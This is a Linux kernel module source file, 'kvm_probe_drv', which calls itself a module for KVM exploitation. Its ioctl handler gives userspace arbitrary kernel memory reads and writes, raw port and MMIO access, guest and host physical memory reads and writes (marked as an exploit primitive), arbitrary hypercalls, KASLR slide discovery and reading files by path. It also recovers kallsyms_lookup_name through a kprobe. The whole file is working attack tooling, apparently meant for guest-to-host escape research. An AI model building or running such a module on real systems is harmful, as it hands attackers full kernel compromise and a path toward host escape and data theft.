#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/device.h>
#include <linux/io.h>
#include <linux/slab.h>
#include <linux/errno.h>
#include <linux/gfp.h>
#include <linux/mm.h>
#include <linux/ktime.h>
#include <linux/types.h>
#include <linux/byteorder/generic.h>
#include <linux/kvm_para.h>
#include <linux/page-flags.h>
#include <linux/pagemap.h>
#include <linux/kdev_t.h>
#include <linux/err.h>
#include <linux/pgtable.h>
#include <linux/kprobes.h>

#define DRIVER_NAME "kvm_probe_drv"
#define DEVICE_FILE_NAME "kvm_probe_dev"

static void *g_vq_virt_addr = NULL;
static dma_addr_t g_vq_phys_addr = 0;
static unsigned long g_vq_pfn = 0;
static unsigned long g_flag_value = 0;

// Kprobe-based kallsyms lookup
static unsigned long (*kallsyms_lookup_name_fn)(const char *name) = NULL;

static int __init find_kallsyms_lookup_name(void)
{
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };

    if (register_kprobe(&kp) < 0)
        return -ENOENT;

    kallsyms_lookup_name_fn = (unsigned long (*)(const char *))kp.addr;
    unregister_kprobe(&kp);
    return 0;
}

struct port_io_data {
    unsigned short port;
    unsigned int size;
    unsigned int value;
};

struct mmio_data {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char __user *user_buffer;
    unsigned long single_value;
    unsigned int value_size;
};

struct gpa_io_data {
    unsigned long gpa;          // Guest Physical Address
    unsigned long size;
    unsigned char __user *user_buffer;
};

struct hpa_io_data {
    unsigned long hpa;          // Host Physical Address (for exploitation)
    unsigned long size;
    unsigned char __user *user_buffer;
};

struct kvm_kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buf;
};

struct kvm_kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buf;
};

struct file_read_request {
    char __user *path;
    unsigned long offset;
    size_t length;
    void __user *user_buffer;
};

struct hypercall_args {
    unsigned long nr;
    unsigned long arg0;
    unsigned long arg1;
    unsigned long arg2;
    unsigned long arg3;
};

// IOCTL definitions
#define IOCTL_READ_PORT          0x1001
#define IOCTL_WRITE_PORT         0x1002
#define IOCTL_READ_MMIO          0x1003  // Hardware/BAR access (uses ioremap)
#define IOCTL_WRITE_MMIO         0x1004  // Hardware/BAR access (uses ioremap)
#define IOCTL_ALLOC_VQ_PAGE      0x1005
#define IOCTL_FREE_VQ_PAGE       0x1006
#define IOCTL_TRIGGER_HYPERCALL  0x1008
#define IOCTL_READ_KERNEL_MEM    0x1009
#define IOCTL_WRITE_KERNEL_MEM   0x100A
#define IOCTL_READ_FLAG_ADDR     0x100C
#define IOCTL_WRITE_FLAG_ADDR    0x100D
#define IOCTL_GET_KASLR_SLIDE    0x100E
#define IOCTL_VIRT_TO_PHYS       0x100F
#define IOCTL_HYPERCALL_ARGS     0x1012
#define IOCTL_READ_FILE          0x1013
#define IOCTL_READ_GPA           0x1014  // Read GUEST physical address
#define IOCTL_WRITE_GPA          0x1015  // Write GUEST physical address
#define IOCTL_PHYS_TO_VIRT       0x1018
#define IOCTL_READ_HPA           0x1019  // Read HOST physical (via ioremap)
#define IOCTL_WRITE_HPA          0x101A  // Write HOST physical (via ioremap)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("KVM Probe Lab");
MODULE_DESCRIPTION("Enhanced kernel module for KVM exploitation - proper address handling");

static int major_num;
static struct class* driver_class = NULL;
static struct device* driver_device = NULL;

static long force_hypercall(void) {
    long ret;
    u64 start = ktime_get_ns();
    ret = kvm_hypercall0(KVM_HC_VAPIC_POLL_IRQ);
    u64 end = ktime_get_ns();
    printk(KERN_INFO "%s: HYPERCALL executed | latency=%llu ns | ret=%ld\n",
           DRIVER_NAME, end - start, ret);
    return ret;
}

static long do_hypercall(struct hypercall_args *args) {
    unsigned long nr = args->nr;
    unsigned long a0 = args->arg0;
    unsigned long a1 = args->arg1;
    unsigned long a2 = args->arg2;
    unsigned long a3 = args->arg3;
    long ret;
    u64 start = ktime_get_ns();

    if (a0 == 0 && a1 == 0 && a2 == 0 && a3 == 0) {
        ret = kvm_hypercall0(nr);
    } else if (a1 == 0 && a2 == 0 && a3 == 0) {
        ret = kvm_hypercall1(nr, a0);
    } else if (a2 == 0 && a3 == 0) {
        ret = kvm_hypercall2(nr, a0, a1);
    } else if (a3 == 0) {
        ret = kvm_hypercall3(nr, a0, a1, a2);
    } else {
        ret = kvm_hypercall4(nr, a0, a1, a2, a3);
    }

    u64 end = ktime_get_ns();
    printk(KERN_INFO "%s: HYPERCALL(%lu) executed | latency=%llu ns | ret=%ld\n",
           DRIVER_NAME, nr, end - start, ret);
    return ret;
}

static int read_host_file(struct file_read_request *req) {
    struct file *filp = NULL;
    void *buffer = NULL;
    char *kernel_path = NULL;
    int ret = -EINVAL;
    loff_t pos = req->offset;

    if (!req || !req->path || !req->user_buffer || req->length == 0 || req->length > 65536)
        return -EINVAL;

    kernel_path = strndup_user(req->path, PATH_MAX);
    if (IS_ERR(kernel_path))
        return PTR_ERR(kernel_path);

    filp = filp_open(kernel_path, O_RDONLY, 0);
    if (IS_ERR(filp)) {
        ret = PTR_ERR(filp);
        goto out_path;
    }

    buffer = vmalloc(req->length);
    if (!buffer) {
        ret = -ENOMEM;
        goto out_file;
    }

    ret = kernel_read(filp, buffer, req->length, &pos);
    if (ret < 0)
        goto out_buffer;

    if (copy_to_user(req->user_buffer, buffer, ret)) {
        ret = -EFAULT;
        goto out_buffer;
    }

    printk(KERN_INFO "%s: Read %d bytes from %s\n", DRIVER_NAME, ret, kernel_path);

out_buffer:
    vfree(buffer);
out_file:
    filp_close(filp, NULL);
out_path:
    kfree(kernel_path);
    return ret;
}

static unsigned long detect_host_kaslr(void) {
    unsigned long host_kernel_base = 0;

    if (!kallsyms_lookup_name_fn && find_kallsyms_lookup_name() < 0) {
        printk(KERN_INFO "%s: Couldn't find kallsyms_lookup_name\n", DRIVER_NAME);
    }

    if (kallsyms_lookup_name_fn) {
        host_kernel_base = kallsyms_lookup_name_fn("_text");
        if (host_kernel_base) {
            printk(KERN_INFO "%s: Found _text via kallsyms: 0x%lx\n",
                   DRIVER_NAME, host_kernel_base);
            return host_kernel_base - 0xffffffff81000000;
        }
    }

    return 0;
}

/*
 * CRITICAL FUNCTION: Handle GUEST Physical Address
 * GPA is what the guest thinks is physical RAM
 * We use __va() to convert to kernel virtual address
 */
static unsigned long gpa_to_kva(unsigned long gpa) {
    // In guest kernel, our "physical" addresses map via __va()
    return (unsigned long)__va(gpa);
}

static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    struct port_io_data p_io_data;
    struct mmio_data m_io_data;
    void __iomem *mapped_addr = NULL;

    printk(KERN_INFO "%s: IOCTL cmd=0x%x, arg=0x%lx\n", DRIVER_NAME, cmd, arg);

    switch (cmd) {
        case IOCTL_READ_PORT:
            if (copy_from_user(&p_io_data, (void __user *)arg, sizeof(p_io_data)))
                return -EFAULT;
            if (p_io_data.size != 1 && p_io_data.size != 2 && p_io_data.size != 4)
                return -EINVAL;
            
            switch (p_io_data.size) {
                case 1: p_io_data.value = inb(p_io_data.port); break;
                case 2: p_io_data.value = inw(p_io_data.port); break;
                case 4: p_io_data.value = inl(p_io_data.port); break;
            }
            
            if (copy_to_user((void __user *)arg, &p_io_data, sizeof(p_io_data)))
                return -EFAULT;
            force_hypercall();
            break;

        case IOCTL_WRITE_PORT:
            if (copy_from_user(&p_io_data, (void __user *)arg, sizeof(p_io_data)))
                return -EFAULT;
            if (p_io_data.size != 1 && p_io_data.size != 2 && p_io_data.size != 4)
                return -EINVAL;
            
            switch (p_io_data.size) {
                case 1: outb((u8)p_io_data.value, p_io_data.port); break;
                case 2: outw((u16)p_io_data.value, p_io_data.port); break;
                case 4: outl((u32)p_io_data.value, p_io_data.port); break;
            }
            force_hypercall();
            break;

        /*
         * MMIO: Uses ioremap() - accesses hardware/PCI BARs
         * This CAN access host physical memory IF:
         * - The address is a valid BAR
         * - The BAR is mapped to host memory
         * - There's an IVSHMEM or similar device
         */
        case IOCTL_READ_MMIO: {
            struct mmio_data data;
            void *kbuf;
            
            if (copy_from_user(&data, (void __user *)arg, sizeof(data)))
                return -EFAULT;
            
            printk(KERN_INFO "%s: MMIO READ: phys=0x%lx size=%lu (ioremap)\n",
                   DRIVER_NAME, data.phys_addr, data.size);
            
            mapped_addr = ioremap(data.phys_addr, data.size);
            if (!mapped_addr)
                return -EFAULT;
            
            kbuf = kmalloc(data.size, GFP_KERNEL);
            if (!kbuf) {
                iounmap(mapped_addr);
                return -ENOMEM;
            }
            
            memcpy_fromio(kbuf, mapped_addr, data.size);
            
            if (copy_to_user(data.user_buffer, kbuf, data.size)) {
                kfree(kbuf);
                iounmap(mapped_addr);
                return -EFAULT;
            }
            
            kfree(kbuf);
            iounmap(mapped_addr);
            force_hypercall();
            return 0;
        }

        case IOCTL_WRITE_MMIO: {
            unsigned char *k_buffer = NULL;
            
            if (copy_from_user(&m_io_data, (void __user *)arg, sizeof(m_io_data)))
                return -EFAULT;
            
            unsigned long map_size = m_io_data.size > 0 ? m_io_data.size : m_io_data.value_size;
            if (map_size == 0)
                return -EINVAL;
            
            printk(KERN_INFO "%s: MMIO WRITE: phys=0x%lx size=%lu (ioremap)\n",
                   DRIVER_NAME, m_io_data.phys_addr, map_size);
            
            mapped_addr = ioremap(m_io_data.phys_addr, map_size);
            if (!mapped_addr)
                return -ENOMEM;
            
            if (m_io_data.size > 0) {
                k_buffer = kmalloc(m_io_data.size, GFP_KERNEL);
                if (!k_buffer) {
                    iounmap(mapped_addr);
                    return -ENOMEM;
                }
                
                if (copy_from_user(k_buffer, m_io_data.user_buffer, m_io_data.size)) {
                    kfree(k_buffer);
                    iounmap(mapped_addr);
                    return -EFAULT;
                }
                
                for (unsigned long i = 0; i < m_io_data.size; ++i) {
                    writeb(k_buffer[i], mapped_addr + i);
                }
                kfree(k_buffer);
            } else {
                switch(m_io_data.value_size) {
                    case 1: writeb((u8)m_io_data.single_value, mapped_addr); break;
                    case 2: writew((u16)m_io_data.single_value, mapped_addr); break;
                    case 4: writel((u32)m_io_data.single_value, mapped_addr); break;
                    case 8: writeq(m_io_data.single_value, mapped_addr); break;
                    default:
                        iounmap(mapped_addr);
                        return -EINVAL;
                }
            }
            
            iounmap(mapped_addr);
            force_hypercall();
            return 0;
        }

        /*
         * GPA: GUEST Physical Address operations
         * These access the GUEST's physical memory (converted to kernel virtual)
         */
        case IOCTL_READ_GPA: {
            struct gpa_io_data data;
            unsigned long kva;
            void *kbuf;
            
            if (copy_from_user(&data, (void __user *)arg, sizeof(data)))
                return -EFAULT;
            
            kva = gpa_to_kva(data.gpa);
            printk(KERN_INFO "%s: GPA READ: gpa=0x%lx -> kva=0x%lx (GUEST memory)\n",
                   DRIVER_NAME, data.gpa, kva);
            
            kbuf = kmalloc(data.size, GFP_KERNEL);
            if (!kbuf)
                return -ENOMEM;
            
            memcpy(kbuf, (void *)kva, data.size);
            
            if (copy_to_user(data.user_buffer, kbuf, data.size)) {
                kfree(kbuf);
                return -EFAULT;
            }
            
            kfree(kbuf);
            force_hypercall();
            return 0;
        }

        case IOCTL_WRITE_GPA: {
            struct gpa_io_data data;
            unsigned long kva;
            void *kbuf;
            
            if (copy_from_user(&data, (void __user *)arg, sizeof(data)))
                return -EFAULT;
            
            kva = gpa_to_kva(data.gpa);
            printk(KERN_INFO "%s: GPA WRITE: gpa=0x%lx -> kva=0x%lx (GUEST memory)\n",
                   DRIVER_NAME, data.gpa, kva);
            
            kbuf = kmalloc(data.size, GFP_KERNEL);
            if (!kbuf)
                return -ENOMEM;
            
            if (copy_from_user(kbuf, data.user_buffer, data.size)) {
                kfree(kbuf);
                return -EFAULT;
            }
            
            memcpy((void *)kva, kbuf, data.size);
            kfree(kbuf);
            force_hypercall();
            return 0;
        }

        /*
         * HPA: HOST Physical Address operations (exploitation primitive)
         * Uses ioremap() - same as MMIO but with clearer semantics
         */
        case IOCTL_READ_HPA: {
            struct hpa_io_data data;
            void __iomem *hpa_mapped;
            void *kbuf;
            
            if (copy_from_user(&data, (void __user *)arg, sizeof(data)))
                return -EFAULT;
            
            printk(KERN_INFO "%s: HPA READ: hpa=0x%lx size=%lu (EXPLOIT: trying host access)\n",
                   DRIVER_NAME, data.hpa, data.size);
            
            hpa_mapped = ioremap(data.hpa, data.size);
            if (!hpa_mapped) {
                printk(KERN_ERR "%s: ioremap failed for HPA 0x%lx\n", DRIVER_NAME, data.hpa);
                return -EFAULT;
            }
            
            kbuf = kmalloc(data.size, GFP_KERNEL);
            if (!kbuf) {
                iounmap(hpa_mapped);
                return -ENOMEM;
            }
            
            memcpy_fromio(kbuf, hpa_mapped, data.size);
            
            if (copy_to_user(data.user_buffer, kbuf, data.size)) {
                kfree(kbuf);
                iounmap(hpa_mapped);
                return -EFAULT;
            }
            
            kfree(kbuf);
            iounmap(hpa_mapped);
            force_hypercall();
            return 0;
        }

        case IOCTL_WRITE_HPA: {
            struct hpa_io_data data;
            void __iomem *hpa_mapped;
            void *kbuf;
            
            if (copy_from_user(&data, (void __user *)arg, sizeof(data)))
                return -EFAULT;
            
            printk(KERN_INFO "%s: HPA WRITE: hpa=0x%lx size=%lu (EXPLOIT: trying host access)\n",
                   DRIVER_NAME, data.hpa, data.size);
            
            hpa_mapped = ioremap(data.hpa, data.size);
            if (!hpa_mapped) {
                printk(KERN_ERR "%s: ioremap failed for HPA 0x%lx\n", DRIVER_NAME, data.hpa);
                return -EFAULT;
            }
            
            kbuf = kmalloc(data.size, GFP_KERNEL);
            if (!kbuf) {
                iounmap(hpa_mapped);
                return -ENOMEM;
            }
            
            if (copy_from_user(kbuf, data.user_buffer, data.size)) {
                kfree(kbuf);
                iounmap(hpa_mapped);
                return -EFAULT;
            }
            
            memcpy_toio(hpa_mapped, kbuf, data.size);
            kfree(kbuf);
            iounmap(hpa_mapped);
            force_hypercall();
            return 0;
        }

        case IOCTL_READ_KERNEL_MEM: {
            struct kvm_kernel_mem_read req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
                return -EFAULT;
            if (!req.kernel_addr || !req.length || !req.user_buf)
                return -EINVAL;
            if (copy_to_user(req.user_buf, (void *)req.kernel_addr, req.length))
                return -EFAULT;
            force_hypercall();
            break;
        }

        case IOCTL_WRITE_KERNEL_MEM: {
            struct kvm_kernel_mem_write req;
            void *tmp;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
                return -EFAULT;
            if (!req.kernel_addr || !req.length || !req.user_buf)
                return -EINVAL;
            tmp = kmalloc(req.length, GFP_KERNEL);
            if (!tmp) return -ENOMEM;
            if (copy_from_user(tmp, req.user_buf, req.length)) {
                kfree(tmp);
                return -EFAULT;
            }
            memcpy((void *)req.kernel_addr, tmp, req.length);
            kfree(tmp);
            force_hypercall();
            break;
        }

        case IOCTL_HYPERCALL_ARGS: {
            struct hypercall_args args;
            long ret;
            if (copy_from_user(&args, (void __user *)arg, sizeof(args)))
                return -EFAULT;
            ret = do_hypercall(&args);
            if (copy_to_user((void __user *)arg, &ret, sizeof(ret)))
                return -EFAULT;
            break;
        }

        case IOCTL_VIRT_TO_PHYS: {
            unsigned long va, pa;
            if (copy_from_user(&va, (void __user *)arg, sizeof(va)))
                return -EFAULT;
            if (!va)
                return -EINVAL;
            pa = virt_to_phys((void *)va);
            return copy_to_user((void __user *)arg, &pa, sizeof(pa)) ? -EFAULT : 0;
        }

        case IOCTL_PHYS_TO_VIRT: {
            unsigned long pa, va;
            if (copy_from_user(&pa, (void __user *)arg, sizeof(pa)))
                return -EFAULT;
            va = (unsigned long)__va(pa);
            return copy_to_user((void __user *)arg, &va, sizeof(va)) ? -EFAULT : 0;
        }

        case IOCTL_GET_KASLR_SLIDE: {
            unsigned long slide = detect_host_kaslr();
            if (!slide)
                return -EINVAL;
            if (copy_to_user((unsigned long __user *)arg, &slide, sizeof(slide)))
                return -EFAULT;
            break;
        }

        case IOCTL_READ_FILE: {
            struct file_read_request req;
            int ret;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
                return -EFAULT;
            ret = read_host_file(&req);
            if (ret < 0)
                return ret;
            if (copy_to_user((void __user *)arg + offsetof(struct file_read_request, length),
                             &ret, sizeof(ret)))
                return -EFAULT;
            return 0;
        }

        case IOCTL_TRIGGER_HYPERCALL: {
            long ret = force_hypercall();
            if (copy_to_user((long __user *)arg, &ret, sizeof(ret)))
                return -EFAULT;
            break;
        }

        default:
            printk(KERN_ERR "%s: Unknown IOCTL: 0x%x\n", DRIVER_NAME, cmd);
            return -EINVAL;
    }
    return 0;
}

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = driver_ioctl,
};

static int __init mod_init(void) {
    printk(KERN_INFO "%s: Init - Proper GPA/HPA handling\n", DRIVER_NAME);

    major_num = register_chrdev(0, DEVICE_FILE_NAME, &fops);
    if (major_num < 0)
        return major_num;
    
    driver_class = class_create(THIS_MODULE, DRIVER_NAME);
    if (IS_ERR(driver_class)) {
        unregister_chrdev(major_num, DEVICE_FILE_NAME);
        return PTR_ERR(driver_class);
    }
    
    driver_device = device_create(driver_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_FILE_NAME);
    if (IS_ERR(driver_device)) {
        class_destroy(driver_class);
        unregister_chrdev(major_num, DEVICE_FILE_NAME);
        return PTR_ERR(driver_device);
    }
    
    printk(KERN_INFO "%s: Device /dev/%s created\n", DRIVER_NAME, DEVICE_FILE_NAME);
    printk(KERN_INFO "%s: GPA ops access GUEST memory, MMIO/HPA ops can access HOST\n", DRIVER_NAME);
    return 0;
}

static void __exit mod_exit(void) {
    if (driver_device)
        device_destroy(driver_class, MKDEV(major_num, 0));
    if (driver_class) {
        class_unregister(driver_class);
        class_destroy(driver_class);
    }
    if (major_num >= 0)
        unregister_chrdev(major_num, DEVICE_FILE_NAME);
    
    printk(KERN_INFO "%s: Module unloaded\n", DRIVER_NAME);
}

module_init(mod_init);
module_exit(mod_exit);